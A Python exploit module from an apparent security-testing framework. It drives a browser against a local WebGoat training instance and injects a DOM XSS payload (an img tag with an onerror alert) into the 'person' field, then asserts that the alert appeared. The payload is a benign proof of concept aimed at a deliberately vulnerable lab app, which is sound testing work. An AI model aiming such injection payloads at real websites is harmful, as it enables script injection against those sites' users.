from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
      'Name' :        'WebGoat_DOM_XSS',
      'Description' : "'DOM XSS' example from WebGoat",
      'References' :  [["EMPTY"]],
      'Target' :      "webgoat",
      'Container': 'ubuntu',
      'TargetLicense' : '',
      'Plugin' : '',
      'VulWikiPage' : "None",
      'Type' : 'DOM XSS'
    }


    def runExploit(self):
        goat = self.wrapper
        goat.navigate("http://guest:guest@localhost:49160/WebGoat/attack")
        goat.find_name("start").click()
        goat.implicit_wait(5)

        goat.navigate("http://localhost:49160/WebGoat/attack?Screen=7&menu=400")
        goat.find_name("person").keys("<IMG SRC='images/logos/owasp.jpg'/>")
        goat.find_xpath("//h1[@id='greeting']/img[@src='images/logos/owasp.jpg']")

        goat.find_name("person").keys("<img src=x onerror=;;alert('XSS') />")
        alert_text = goat.handle_alert()
        self.assertIn("XSS", alert_text, "Exploit didn't work!")
